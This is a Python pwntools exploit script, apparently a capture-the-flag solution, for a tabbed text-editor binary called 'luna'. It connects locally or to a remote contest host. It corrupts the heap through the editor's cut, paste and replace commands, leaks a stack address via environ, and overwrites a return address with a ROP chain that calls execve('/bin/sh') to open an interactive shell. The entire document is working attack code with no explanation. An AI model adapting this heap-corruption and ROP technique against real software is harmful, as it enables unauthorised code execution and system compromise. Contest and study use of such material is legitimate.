#!/usr/bin/env python
from pwn import *

def proofofwork():
    s.recvline()
    s.sendline(process(['hashcash', '-mb25', s.recvline(False).split(' ')[2]]).recvline(False).split(': ')[1])

if len(sys.argv) == 1:
    s = process('./run.sh')
else:
    s = remote('13.230.132.4', 21700)
    proofofwork()

elf = ELF('./luna')

def insert(index, text):
    s.sendlineafter('>>> ', 'i %d ' % index + text)

def newtab():
    s.sendlineafter('>>> ', 'n')

def select(tab):
    s.sendlineafter('>>> ', 's %d' % tab)

def display(index, length):
    s.sendlineafter('>>> ', 'd %d %d' % (index, length))
    s.recvline()
    return s.recv(length)

def cut(index, length):
    s.sendlineafter('>>> ', 'c %d %d' % (index, length))

def paste(index):
    s.sendlineafter('>>> ', 'p %d' % index)

def replace(index, length, ch):
    s.sendlineafter('>>> ', 'r %d %d %c' % (index, length, ch))

def reverse(index, length):
    s.sendlineafter('>>> ', 'R %d %d' % (index, length))

def delete(index, length):
    s.sendlineafter('>>> ', 'D %d %d' % (index, length))

def quit():
    s.sendlineafter('>>> ', 'q')

insert(0, 'A' * 8)
cut(0, 0x8)
newtab() # 1
insert(0, 'A' * 0xff)
cut(0, 0xfe)
select(0)
paste(0)
select(1)
cut(0, 1)
select(0)

replace(0x18, 1, '\x41')
newtab() # 2
paste(0)
select(0)

for i, b in enumerate(p64(elf.symbols['environ'])[:3]):
    replace(0x20 + i, 1, b)

newtab() # 3
insert(0, '\0' * 0x29)
newtab() # 4
insert(0, '\0' * 0x29)
newtab() # 5
insert(0, '\0' * 0x29)
cut(0, 0x29)
newtab() # 6
insert(0, 'A' * 0xf8)
cut(0, 0xf7)

newtab() # 7
insert(0, (p64(0) * 3 + p64(0x21) + p64(0) * 3 + p64(0x21)).ljust(0xff, 'B'))
select(0)

replace(0x58, 1, '\x21')
replace(0x59, 1, '\0')

text_addr = 0x6d9360

select(1)
insert(0, p64(text_addr + 0x10) + p64(0) + '/bin/sh\0')

newtab() # 8
paste(0)

select(0)

stack_addr = ''
for i in range(8):
    stack_addr += display(0x70 + i, 1)
stack_addr = u64(stack_addr) - 0x130
log.info('stack address: %#x' % stack_addr)

replace(0x70, 1, p64(stack_addr)[0])
replace(0x71, 1, p64(stack_addr)[1])

select(8)

syscall = 0x47f125
pop_rax = 0x44aadc
pop_rdi = 0x4006a6
pop_rsi = 0x4a64bb
pop_rdx = 0x44d836

payload = ''
payload += p64(pop_rdi) + p64(text_addr + 0x10)
payload += p64(pop_rsi) + p64(text_addr + 0x0)
payload += p64(pop_rdx) + p64(text_addr + 0x8)
payload += p64(pop_rax) + p64(0x3b)
payload += p64(syscall)

for i, b in enumerate(payload):
    replace(i, 1, b)

quit()

s.recvuntil('Bye bye\r\n')

s.interactive()
